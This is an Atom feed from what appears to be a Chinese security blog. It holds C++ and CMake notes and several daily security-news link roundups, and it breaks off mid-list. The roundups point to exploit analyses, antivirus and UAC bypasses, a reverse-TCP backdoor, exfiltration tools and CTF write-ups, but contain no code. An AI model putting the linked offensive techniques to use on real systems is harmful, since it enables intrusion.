<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M0rk&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kevien.github.io/"/>
  <updated>2017-09-29T10:25:01.000Z</updated>
  <id>http://kevien.github.io/</id>
  
  <author>
    <name>M0rk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>c++易混淆点笔记</title>
    <link href="http://kevien.github.io/2017/09/29/c-%E6%98%93%E6%B7%B7%E6%B7%86%E7%82%B9%E7%AC%94%E8%AE%B0/"/>
    <id>http://kevien.github.io/2017/09/29/c-易混淆点笔记/</id>
    <published>2017-09-29T04:45:39.000Z</published>
    <updated>2017-09-29T10:25:01.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul>
<li>主要记录一些容易忽略和忘记的知识点，原因是有些知识点刚看过之后觉的懂了，但是过段时间可能又忘记了的情况。<br>#### </li>
<li>std standard的缩写，我们在使用c++的标准库的标识符的时候需要使用using namespace std；使用了命名空间std的有  cstdio cmath  csring string等。</li>
<li>今天学习STL,才真正意识到什么是容器。也觉得以前都没有怎么去理解容器，每一种语言都有自己的容器，像python中有list、dict、tuple等容器，java中有arraylist、hashset、hashmap等容器，可以说容器是复杂的数据结构(相对于简单的数据结构int，float这种)。c++ 中标准STL序列容器：vector、string、deque和list。<br><br>标准STL关联容器：set、multiset、map和multimap。每种容器类型都定义了自己的迭代器类型，如vector<br><br>vector<int>::iterator iter;这条语句定义了一个名为iter的变量，它的数据类型是由vector<int>定义的iterator类型。<br><br>list<int>::iterator iter1;这条语句定义了一个名为iter1的变量，它的数据类型是由list<int>定义的iterator类型。<br><br><a href="https://www.wikiwand.com/zh-hans/%E5%AE%B9%E5%99%A8_(%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B" target="_blank" rel="external">wiki对容器的介绍</a>)</int></int></int></int></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;主要记录一些容易忽略和忘记的知识点，原因是有些知识点刚看过之后觉的懂了，但是过段时间可能又忘记了的情况。&lt;br&gt;#### &lt;/l
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170929安全动态</title>
    <link href="http://kevien.github.io/2017/09/29/20170929%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/29/20170929安全动态/</id>
    <published>2017-09-29T02:00:47.000Z</published>
    <updated>2017-09-29T05:07:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>####</p>
<ul>
<li>浏览器中的僵尸网络：了解恶意浏览器扩展引起的威胁(Paper)<br><a href="https://arxiv.org/pdf/1709.09577.pdf" target="_blank" rel="external">https://arxiv.org/pdf/1709.09577.pdf</a></li>
<li>Mac OS X 10.12 Quarantine Bypass - macOS 的 rhtmlPlayer.html 存在一个 DOM XSS，攻击者可以利用 rhtmlPlayer.html 实现在无限制的上下文中实现 JavaScript 任意命令执行，譬如直接读 /etc/passwd<br><https: 3449="" blogs.securiteam.com="" index.php="" archives=""></https:></li>
<li>CyberArk Lab 研究员发现 Windows Defender 在扫描 SMB 共享的文件时存在比较奇怪的行为，利用这个可以 Bypass Windows Defender 的检测<br><a href="https://www.cyberark.com/threat-research-blog/illusion-gap-antivirus-bypass-part-1/" target="_blank" rel="external">https://www.cyberark.com/threat-research-blog/illusion-gap-antivirus-bypass-part-1/</a></li>
<li>黑帽SEO剖析之手法篇<br><a href="https://thief.one/2017/09/28/1/" target="_blank" rel="external">https://thief.one/2017/09/28/1/</a></li>
<li>针对NFS服务的渗透测试指南<br><a href="https://pentestacademy.wordpress.com/2017/09/20/nfs/" target="_blank" rel="external">https://pentestacademy.wordpress.com/2017/09/20/nfs/</a></li>
<li>这个Spring高危漏洞，你修补了吗？<br><a href="https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA" target="_blank" rel="external">https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA</a></li>
<li>借用Microsoft代码签名证书<br><a href="https://blog.conscioushacker.io/index.php/2017/09/27/borrowing-microsoft-code-signing-certificates/" target="_blank" rel="external">https://blog.conscioushacker.io/index.php/2017/09/27/borrowing-microsoft-code-signing-certificates/</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>腾讯哈勃沙箱<br><a href="https://github.com/Tencent/HaboMalHunter" target="_blank" rel="external">https://github.com/Tencent/HaboMalHunter</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;####&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;浏览器中的僵尸网络：了解恶意浏览器扩展引起的威胁(Paper)&lt;br&gt;&lt;a href=&quot;https://arxiv.org/pdf/1709.09577.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https:
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>windows域安全</title>
    <link href="http://kevien.github.io/2017/09/28/windows%E5%9F%9F%E5%AE%89%E5%85%A8/"/>
    <id>http://kevien.github.io/2017/09/28/windows域安全/</id>
    <published>2017-09-28T06:40:42.000Z</published>
    <updated>2017-09-28T06:41:16.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>####</p>
<ul>
<li>总之：Active Directory = LDAP服务器＋LDAP应用（Windows域控）<br>就是Active Directory先实现一个LDAP服务器，然后自己先用这个LDAP服务器实现了自己的一个具体应用（域控）。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;####&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;总之：Active Directory = LDAP服务器＋LDAP应用（Windows域控）&lt;br&gt;就
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Cmake使用笔记</title>
    <link href="http://kevien.github.io/2017/09/28/Cmake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://kevien.github.io/2017/09/28/Cmake使用笔记/</id>
    <published>2017-09-28T02:40:33.000Z</published>
    <updated>2017-09-28T07:47:18.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
<li><p><a href="https://www.wikiwand.com/en/CMake" target="_blank" rel="external">wiki关于cmake介绍</a></p>
</li>
<li><p><a href="https://cmake.org/documentation/" target="_blank" rel="external">官方文档</a> 熟悉某种技术的最好最快的方法还是要通过阅读官方文档:P</p>
</li>
</ul>
<h4 id="windows下使用"><a href="#windows下使用" class="headerlink" title="windows下使用"></a>windows下使用</h4><ul>
<li>Gui界面使用<br>!()[cmake.png]<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.youtube.com/watch?v=gYmgbqGfv-8" target="_blank" rel="external">https://www.youtube.com/watch?v=gYmgbqGfv-8</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.wikiwand.com/en/CMake&quot; target=&quot;_blank&quot; r
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170927安全动态(以后每2天更新)</title>
    <link href="http://kevien.github.io/2017/09/27/20170927%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81-%E4%BB%A5%E5%90%8E%E6%AF%8F2%E5%A4%A9%E6%9B%B4%E6%96%B0/"/>
    <id>http://kevien.github.io/2017/09/27/20170927安全动态-以后每2天更新/</id>
    <published>2017-09-27T10:38:36.000Z</published>
    <updated>2017-09-28T11:28:08.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="安全动态"><a href="#安全动态" class="headerlink" title="安全动态"></a>安全动态</h4><ul>
<li><p>通过数据包端口号进行数据渗出：PacketKnockOut<br><a href="https://n0where.net/data-exfiltration-via-packet-port-numbers-packetknockout/" target="_blank" rel="external">https://n0where.net/data-exfiltration-via-packet-port-numbers-packetknockout/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">搞apt的可以研究一下</div></pre></td></tr></table></figure>
</li>
<li><p>一款智能家居设备的远程命令执行漏洞分析<br><a href="https://forsec.nl/2017/09/smart-home-remote-command-execution-rce/" target="_blank" rel="external">https://forsec.nl/2017/09/smart-home-remote-command-execution-rce/</a></p>
</li>
<li>BlobRunner - 在恶意软件分析过程中快速调试 ShellCode 的工具<br><a href="https://github.com/OALabs/BlobRunner" target="_blank" rel="external">https://github.com/OALabs/BlobRunner</a></li>
<li>Awesome-MitM - GitHub 上一些不错的网络中间人攻击框架收集<br><a href="https://github.com/Chan9390/Awesome-MitM" target="_blank" rel="external">https://github.com/Chan9390/Awesome-MitM</a></li>
<li>使用 IDA 调试 iOS 程序的步骤<br><a href="http://blog.csdn.net/proteas/article/details/78083512" target="_blank" rel="external">http://blog.csdn.net/proteas/article/details/78083512</a></li>
<li>JEB2插件教程之一<br><a href="https://blog.flanker017.me/writing-jeb2-plugin/" target="_blank" rel="external">https://blog.flanker017.me/writing-jeb2-plugin/</a></li>
<li>一个介绍主流漏洞悬赏平台、安全书籍、常见安全工具及漏洞类型的CheatSheet<br><a href="https://github.com/EdOverflow/bugbounty-cheatsheet" target="_blank" rel="external">https://github.com/EdOverflow/bugbounty-cheatsheet</a></li>
<li>BypassD盾IIS防火墙SQL注入防御（多姿势）<br><https: xianzhi.aliyun.com="" forum="" read="" 2173.html=""></https:></li>
<li>开源无效流量检测项目<br><a href="http://nameles.org/" target="_blank" rel="external">http://nameles.org/</a></li>
<li>参数特定XSS的故事<br><a href="http://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html" target="_blank" rel="external">http://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html</a></li>
<li>各种应用加密加固<br><a href="https://bettercrypto.org/static/applied-crypto-hardening.pdf" target="_blank" rel="external">https://bettercrypto.org/static/applied-crypto-hardening.pdf</a></li>
<li>基于 Windows ETW（事件日志）的入侵检测，来自微软研究员在 DerbyCon 2017 会议的演讲。之前推送过他在微软 Blog 上写过的两篇相关文章<br><a href="https://github.com/zacbrown/hiddentreasure-etw-demo/blob/master/zbrown-HiddenTreasureETW-DerbyCon7.pdf" target="_blank" rel="external">https://github.com/zacbrown/hiddentreasure-etw-demo/blob/master/zbrown-HiddenTreasureETW-DerbyCon7.pdf</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>在 linux 下使用 CMake 构建应用程序<br><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-cmake/" target="_blank" rel="external">https://www.ibm.com/developerworks/cn/linux/l-cn-cmake/</a></li>
<li>64-bit version of Boost for 64-bit windows<br><a href="https://stackoverflow.com/questions/2322255/64-bit-version-of-boost-for-64-bit-windows" target="_blank" rel="external">https://stackoverflow.com/questions/2322255/64-bit-version-of-boost-for-64-bit-windows</a></li>
<li>查看lib是32位还是64位的<br>“C:\Program Files\Microsoft Visual Studio\VC98\Bin\DUMPBIN.EXE”  C:\boost_1_65_0\lib32-msvc-14.0\boost_atomic-vc140-mt-1_65.lib  /headers<br>*.lib | findstr machine<br><img src="/2017/09/27/20170927安全动态-以后每2天更新/dumplib.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;安全动态&quot;&gt;&lt;a href=&quot;#安全动态&quot; class=&quot;headerlink&quot; title=&quot;安全动态&quot;&gt;&lt;/a&gt;安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;通过数据包端口号进行数据渗出：PacketKnockOut&lt;br&gt;&lt;a href=&quot;https://n0w
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170926安全动态</title>
    <link href="http://kevien.github.io/2017/09/26/20170926%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/26/20170926安全动态/</id>
    <published>2017-09-26T03:14:11.000Z</published>
    <updated>2017-09-27T03:25:14.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>ROP介绍<br><a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x68;&#x74;&#116;&#x70;&#x73;&#58;&#x2f;&#47;&#x6d;&#101;&#x64;&#105;&#x75;&#109;&#46;&#x63;&#x6f;&#x6d;&#x2f;&#x40;&#x69;&#115;&#x65;&#101;&#116;&#104;&#105;&#101;&#x76;&#x65;&#x73;&#47;&#x69;&#110;&#x74;&#114;&#x6f;&#x2d;&#116;&#111;&#x2d;&#x72;&#x6f;&#112;&#x2d;&#114;&#111;&#112;&#x2d;&#101;&#109;&#112;&#x6f;&#x72;&#105;&#x75;&#109;&#45;&#x73;&#112;&#x6c;&#x69;&#x74;&#45;&#57;&#98;&#50;&#x65;&#x63;&#x36;&#100;&#x34;&#100;&#98;&#x30;&#56;">&#x68;&#x74;&#116;&#x70;&#x73;&#58;&#x2f;&#47;&#x6d;&#101;&#x64;&#105;&#x75;&#109;&#46;&#x63;&#x6f;&#x6d;&#x2f;&#x40;&#x69;&#115;&#x65;&#101;&#116;&#104;&#105;&#101;&#x76;&#x65;&#x73;&#47;&#x69;&#110;&#x74;&#114;&#x6f;&#x2d;&#116;&#111;&#x2d;&#x72;&#x6f;&#112;&#x2d;&#114;&#111;&#112;&#x2d;&#101;&#109;&#112;&#x6f;&#x72;&#105;&#x75;&#109;&#45;&#x73;&#112;&#x6c;&#x69;&#x74;&#45;&#57;&#98;&#50;&#x65;&#x63;&#x36;&#100;&#x34;&#100;&#98;&#x30;&#56;</a></li>
<li>Biting the Apple that feeds you（咬一口嘴边的苹果） - macOS 内核的 Fuzzing，来自 MWR Labs 在 44CON 会议的演讲<br><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-44con-biting-the-apple-that-feeds-you-2017-09-25.pdf" target="_blank" rel="external">https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-44con-biting-the-apple-that-feeds-you-2017-09-25.pdf</a></li>
<li>High Sierra macOS 系统中，未签名的程序通过编程可以导出 keychain 中的明文密码<br><a href="https://twitter.com/i/web/status/912254053849079808" target="_blank" rel="external">https://twitter.com/i/web/status/912254053849079808</a></li>
<li>macOS High Sierra 10.13 安全更新内容<br><a href="https://support.apple.com/en-us/HT208144" target="_blank" rel="external">https://support.apple.com/en-us/HT208144</a></li>
<li>寻找内存驻留的恶意软件<br><a href="http://www.irongeek.com/i.php?page=videos/derbycon7/s21-hunting-for-memory-resident-malware-joe-desimone" target="_blank" rel="external">http://www.irongeek.com/i.php?page=videos/derbycon7/s21-hunting-for-memory-resident-malware-joe-desimone</a></li>
<li>SSL/TLS layers for scapy the interactive packet manipulation tool<br><a href="https://github.com/tintinweb/scapy-ssl_tls" target="_blank" rel="external">https://github.com/tintinweb/scapy-ssl_tls</a></li>
<li>BaRMIe - Java RMI枚举和攻击工具<br><a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="external">https://github.com/NickstaDB/BaRMIe</a></li>
<li>BLE – 一款 BLE 扫描器<br><a href="https://github.com/evilsocket/bleah" target="_blank" rel="external">https://github.com/evilsocket/bleah</a></li>
<li>PyMLProjects: Python 机器学习项目<br><a href="https://github.com/k3170makan/PyMLProjects" target="_blank" rel="external">https://github.com/k3170makan/PyMLProjects</a></li>
<li>redsails - 一个基于 Python 的后渗透项目，旨在绕过基于主机的安全监控与日志记录<br><a href="https://github.com/BeetleChunks/redsails" target="_blank" rel="external">https://github.com/BeetleChunks/redsails</a></li>
<li>从核心概念和技术层面着眼，系统化认识RPC<br><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2650997997&amp;idx=1&amp;sn=cdcd04fb6c5f2e6deb4b0ae89102ddf8&amp;amp" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2650997997&amp;idx=1&amp;sn=cdcd04fb6c5f2e6deb4b0ae89102ddf8&amp;amp</a></li>
<li>Sysmon v6.10 VS WMI Persistence<br><a href="https://rawsec.lu/blog/posts/2017/Sep/19/sysmon-v610-vs-wmi-persistence/" target="_blank" rel="external">https://rawsec.lu/blog/posts/2017/Sep/19/sysmon-v610-vs-wmi-persistence/</a></li>
<li>NodeJS Debugger 命令注入<br><a href="https://packetstormsecurity.com/files/144333" target="_blank" rel="external">https://packetstormsecurity.com/files/144333</a></li>
<li>谷歌测试5款主流浏览器  Safari最不安全<br><https: www.bleepingcomputer.com="" news="" security="" google-experiment-tests-top-5-browsers-finds-safari-riddled-with-security-bugs=""></https:></li>
<li>Don’t Google ‘PowerShell Hunting’<br><a href="https://www.youtube.com/watch?v=1mfVPLPxKTc" target="_blank" rel="external">https://www.youtube.com/watch?v=1mfVPLPxKTc</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;ROP介绍&lt;br&gt;&lt;a href=&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170925安全动态</title>
    <link href="http://kevien.github.io/2017/09/25/20170925%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/25/20170925安全动态/</id>
    <published>2017-09-25T02:05:27.000Z</published>
    <updated>2017-09-27T03:25:14.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>使用Kerberoast破解Kerberos TGS票据：利用Kerberos突破活动目录域<br><a href="http://bobao.360.cn/learning/detail/4256.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4256.html</a></li>
<li>beef+msf实现内网渗透<br><a href="https://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651865513&amp;idx=1&amp;sn=7b6fe6d129896b80da6a5e458416ee29&amp;chksm=8442b94eb335305847276fffdbd9bd998a6f84fb282facf6d81fa82cc49cb7657194d478f33e&amp;mpshare=1&amp;scene=23&amp;srcid=0925P5WOPLnnpM8uarmiKnj9#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651865513&amp;idx=1&amp;sn=7b6fe6d129896b80da6a5e458416ee29&amp;chksm=8442b94eb335305847276fffdbd9bd998a6f84fb282facf6d81fa82cc49cb7657194d478f33e&amp;mpshare=1&amp;scene=23&amp;srcid=0925P5WOPLnnpM8uarmiKnj9#rd</a></li>
<li>向运行的Python进程中注入代码<br><a href="https://github.com/lmacken/pyrasite" target="_blank" rel="external">https://github.com/lmacken/pyrasite</a></li>
<li>我是如何拿到google 13337刀赏金的<br><a href="https://thesecurityexperts.wordpress.com/2017/09/24/how-i-got-13337-bounty-from-google/" target="_blank" rel="external">https://thesecurityexperts.wordpress.com/2017/09/24/how-i-got-13337-bounty-from-google/</a></li>
<li>DerbyCon 2016 会议的一篇演讲《Better Network Defense Through Threat Injection and Hunting》<br><a href="https://zachgrace.com/public/presentations/DerbyCon_2016_ZG_BG.pdf" target="_blank" rel="external">https://zachgrace.com/public/presentations/DerbyCon_2016_ZG_BG.pdf</a></li>
<li>DerbyCon 2017 会议一篇关于威胁检测的议题《Purpose Driven Hunt》<br><a href="https://www.slideshare.net/JaredAtkinson/purpose-driven-hunt-derbycon-2017/1" target="_blank" rel="external">https://www.slideshare.net/JaredAtkinson/purpose-driven-hunt-derbycon-2017/1</a></li>
<li>Wink 和 Insteon 的智能家居设备存在多个漏洞<br><a href="https://blog.rapid7.com/2017/09/22/multiple-vulnerabilities-in-wink-and-insteon-smart-home-systems/" target="_blank" rel="external">https://blog.rapid7.com/2017/09/22/multiple-vulnerabilities-in-wink-and-insteon-smart-home-systems/</a></li>
<li>FinFisher 正在 ISP 级别发起中间人劫持攻击，用木马感染文件下载<br><a href="https://www.welivesecurity.com/2017/09/21/new-finfisher-surveillance-campaigns/" target="_blank" rel="external">https://www.welivesecurity.com/2017/09/21/new-finfisher-surveillance-campaigns/</a></li>
<li>Blaze’s Security Blog 对一个恶意广告点击网络的分析<br><a href="https://bartblaze.blogspot.fr/2017/09/malicious-adclick-networks-common-or.html" target="_blank" rel="external">https://bartblaze.blogspot.fr/2017/09/malicious-adclick-networks-common-or.html</a></li>
<li>过期的域名在渗透测试团队手里有大用处<br><a href="http://threatexpress.com/2017/03/leveraging-expired-domains-for-red-team-engagements/" target="_blank" rel="external">http://threatexpress.com/2017/03/leveraging-expired-domains-for-red-team-engagements/</a></li>
<li>在 Windows Shellcode 中对 32 位和 64 位架构的判断<br><a href="https://osandamalith.com/2017/09/24/detecting-architecture-in-windows/" target="_blank" rel="external">https://osandamalith.com/2017/09/24/detecting-architecture-in-windows/</a></li>
<li>Batch, attach and patch: using windbg’s local kernel debugger to execute code in windows kernel。 利用 WinDbg 的本地内核调试器在 Windows 内核中执行代码<br><a href="https://vallejo.cc/2015/06/07/batch-attach-and-patch-using-windbgs-local-kernel-debugger-to-execute-code-in-windows-kernel/" target="_blank" rel="external">https://vallejo.cc/2015/06/07/batch-attach-and-patch-using-windbgs-local-kernel-debugger-to-execute-code-in-windows-kernel/</a></li>
<li>不是安全边界，Bypass UAC<br><a href="https://www.slideshare.net/enigma0x3/not-a-security-boundary-bypassing-user-account-control" target="_blank" rel="external">https://www.slideshare.net/enigma0x3/not-a-security-boundary-bypassing-user-account-control</a></li>
<li>来自 DerbyCon 会议的演讲《Beyond xp_cmdshell: Owning the Empire through SQL Server 》<br><a href="https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server" target="_blank" rel="external">https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server</a></li>
<li>Derbycon 2017 会议的演讲 《Windows Rootkit 开发 - 从 Python 原型实现到内核态的 C&amp;C》<br><a href="http://www.irongeek.com/i.php?page=videos/derbycon7/t310-windows-rootkit-development-python-prototyping-to-kernel-level-c2-rj-mcdown" target="_blank" rel="external">http://www.irongeek.com/i.php?page=videos/derbycon7/t310-windows-rootkit-development-python-prototyping-to-kernel-level-c2-rj-mcdown</a></li>
<li>来自 DerbyCon 会议的演讲《Here Be Dragons: The Unexplored Land of Active Directory ACLs》<br><a href="https://www.slideshare.net/AndyRobbins3/here-be-dragons-the-unexplored-land-of-active-directory-acls" target="_blank" rel="external">https://www.slideshare.net/AndyRobbins3/here-be-dragons-the-unexplored-land-of-active-directory-acls</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;使用Kerberoast破解Kerberos TGS票据：利用Kerberos突破活动目录域&lt;b
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170922安全动态</title>
    <link href="http://kevien.github.io/2017/09/22/20170922%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/22/20170922安全动态/</id>
    <published>2017-09-22T02:18:05.000Z</published>
    <updated>2017-09-24T04:06:03.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>Python 对象注入漏洞利用<br><a href="http://defencely.com/blog/defencely-clarifies-python-object-injection-exploitation/" target="_blank" rel="external">http://defencely.com/blog/defencely-clarifies-python-object-injection-exploitation/</a></li>
<li>Ticket Trick - 利用企业邮箱登陆功能潜入企业内部网络，大量企业受影响<br><a href="https://medium.freecodecamp.org/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c" target="_blank" rel="external">https://medium.freecodecamp.org/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c</a></li>
<li>LiMEaide - 基于 Python 实现的远程转储 Linux 客户端 RAM 工具<br><a href="https://github.com/kd8bny/LiMEaide" target="_blank" rel="external">https://github.com/kd8bny/LiMEaide</a></li>
<li>Python沙箱逃逸的n种姿势<br><a href="https://xianzhi.aliyun.com/forum/read/2138.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/2138.html</a></li>
<li>如何枚举Windows中的进程、线程以及映像加载通知回调例程<br><a href="http://bobao.360.cn/learning/detail/4459.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4459.html</a></li>
<li>针对联网智能灯泡的安全性分析<br><a href="https://www.contextis.com/blog/hacking-into-internet-connected-light-bulbs" target="_blank" rel="external">https://www.contextis.com/blog/hacking-into-internet-connected-light-bulbs</a></li>
<li>CVE-2016-10190详细分析  ffmpeg<br><a href="https://nandynarwhals.org/cve-2016-10190/" target="_blank" rel="external">https://nandynarwhals.org/cve-2016-10190/</a></li>
<li>dorkbot:Command-line tool to scan Google search results for vulnerabilities<br><a href="https://github.com/utiso/dorkbot" target="_blank" rel="external">https://github.com/utiso/dorkbot</a></li>
<li>Linux应急响应姿势浅谈<br><a href="https://xianzhi.aliyun.com/forum/read/2150.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/2150.html</a></li>
<li>EternalPot — Lessons from building a global Nation State SMB exploit honeypot infrastructure<br><a href="https://doublepulsar.com/eternalpot-lessons-from-building-a-global-nation-state-smb-exploit-honeypot-infrastructure-3f2a0b064ffe" target="_blank" rel="external">https://doublepulsar.com/eternalpot-lessons-from-building-a-global-nation-state-smb-exploit-honeypot-infrastructure-3f2a0b064ffe</a></li>
<li>Python PyYAML反序列化漏洞实验和Payload构造<br><a href="http://www.polaris-lab.com/index.php/archives/375/" target="_blank" rel="external">http://www.polaris-lab.com/index.php/archives/375/</a></li>
<li>.NET反序列化Payload生成<br><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="external">https://github.com/pwntester/ysoserial.net</a></li>
<li>HACK THE HACKER – FUZZING MIMIKATZ ON WINDOWS WITH WINAFL &amp; HEATMAPS (0DAY)<br><a href="https://www.sec-consult.com/en/blog/2017/09/hack-the-hacker-fuzzing-mimikatz-on-windows-with-winafl-heatmaps-0day/index.html?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">https://www.sec-consult.com/en/blog/2017/09/hack-the-hacker-fuzzing-mimikatz-on-windows-with-winafl-heatmaps-0day/index.html?from=timeline&amp;isappinstalled=0</a></li>
<li>基于Python的TCP后门<br><a href="https://github.com/TheBlaCkCoDeR09/Python_Reverse_TCP" target="_blank" rel="external">https://github.com/TheBlaCkCoDeR09/Python_Reverse_TCP</a></li>
<li>Optionsbleed实践<br><a href="https://www.securitysift.com/testing-optionsbleed/" target="_blank" rel="external">https://www.securitysift.com/testing-optionsbleed/</a></li>
<li>ISQL LINUX SQL管理工具缓冲区溢出漏洞<br><a href="https://whereisk0shl.top/post/2017-09-23" target="_blank" rel="external">https://whereisk0shl.top/post/2017-09-23</a></li>
<li>HTML HELP WORKSHOP .SEH本地代码执行漏洞<br><a href="https://whereisk0shl.top/post/html-help-workshop-.sehben-di-dai-ma-zhi-xing-lou-dong" target="_blank" rel="external">https://whereisk0shl.top/post/html-help-workshop-.sehben-di-dai-ma-zhi-xing-lou-dong</a></li>
<li>[质量局!!]HITB GSEC CTF WIN PWN解题全记录之BABYSTACK<br><a href="https://whereisk0shl.top/post/hitb_gsec_ctf_babystack_writeup" target="_blank" rel="external">https://whereisk0shl.top/post/hitb_gsec_ctf_babystack_writeup</a></li>
<li>[CVE-2014-6287]REJETTO HTTP FILE SERVER远程命令执行漏洞分析<br><a href="https://whereisk0shl.top/post/cve-2014-6287-rejetto-http-file-serveryuan-cheng-ming-ling-zhi-xing-lou-dong-fen-xi" target="_blank" rel="external">https://whereisk0shl.top/post/cve-2014-6287-rejetto-http-file-serveryuan-cheng-ming-ling-zhi-xing-lou-dong-fen-xi</a></li>
<li>[MS12-077]IE10 CMARKUP USE AFTER FREE漏洞分析<br><a href="https://whereisk0shl.top/post/ms12-077-ie10-cmarkup-use-after-freelou-dong-fen-xi" target="_blank" rel="external">https://whereisk0shl.top/post/ms12-077-ie10-cmarkup-use-after-freelou-dong-fen-xi</a></li>
<li>PROFTPD-1.3.3C后门分析<br><a href="https://whereisk0shl.top/post/proftpd-1.3.3chou-men-fen-xi" target="_blank" rel="external">https://whereisk0shl.top/post/proftpd-1.3.3chou-men-fen-xi</a></li>
<li>JCG路由命令执行漏洞分析<br><a href="https://whereisk0shl.top/post/jcglu-you-ming-ling-zhi-xing-lou-dong-fen-xi" target="_blank" rel="external">https://whereisk0shl.top/post/jcglu-you-ming-ling-zhi-xing-lou-dong-fen-xi</a></li>
